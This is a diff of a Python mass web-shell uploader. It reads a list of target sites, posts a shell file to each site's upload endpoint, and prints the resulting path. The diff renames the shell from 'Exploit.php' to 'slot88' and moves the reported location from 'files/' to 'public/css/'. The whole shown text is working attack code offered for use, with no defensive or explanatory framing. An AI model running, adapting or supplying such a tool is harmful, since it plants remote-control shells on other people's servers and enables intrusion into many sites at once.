@@ -14,16 +14,16 @@ def banner():
                 
 def main():
 	site = input ("\n Enter site list::> ")
-	shell = 'Exploit.php' #yourshell.php
+	shell = 'slot88' #yourshell.php
 	opened = open(site)
 	for x in opened:
 		x = x.strip()
 		files = {'files': open(shell, 'rb')}
 		r = requests.post(x, files=files)
 		if r.status_code==200:
-			print("\nSuccess==>",x+'files/'+shell)
+			print("\nSuccess==>",x+'public/css/'+shell)
 		else:
-			print("\nFail==>",x+'files/'+shell)
+			print("\nFail==>",x+'public/css/'+shell)
 
 banner()
 main()    
